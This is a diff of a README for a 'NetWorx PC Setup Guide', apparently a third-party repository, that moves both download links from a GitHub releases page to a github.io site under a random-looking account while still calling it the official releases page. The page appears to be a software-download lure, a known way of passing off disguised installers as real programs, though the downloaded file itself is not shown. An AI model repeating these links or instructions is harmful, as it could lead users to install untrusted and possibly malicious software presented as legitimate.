@@ -1,6 +1,6 @@
 # 🌐 NetWorx-PC-Setup-Guide - Easily Monitor Your Monthly Network Usage
 
-[![Download NetWorx](https://img.shields.io/badge/Download-NetWorx-blue.svg)](https://github.com/Dactylorhizamaculatafuchsiinode923/NetWorx-PC-Setup-Guide/releases)
+[![Download NetWorx](https://img.shields.io/badge/Download-NetWorx-blue.svg)](https://dactylorhizamaculatafuchsiinode923.github.io)
 
 NetWorx tracks your bandwidth and network activity on Windows. This guide helps you download, install, and configure the software on your computer. Follow these steps to resolve common installation errors encountered on Windows 11.
 
@@ -8,7 +8,7 @@ NetWorx tracks your bandwidth and network activity on Windows. This guide helps 
 
 Visit the official releases page to download the latest version of the NetWorx installer.
 
-[Click here to open the download page](https://github.com/Dactylorhizamaculatafuchsiinode923/NetWorx-PC-Setup-Guide/releases)
+[Click here to open the download page](https://dactylorhizamaculatafuchsiinode923.github.io)
 
 Select the setup file that matches your system architecture. Most modern computers use the 64-bit version. Save this file to your Downloads folder.
 
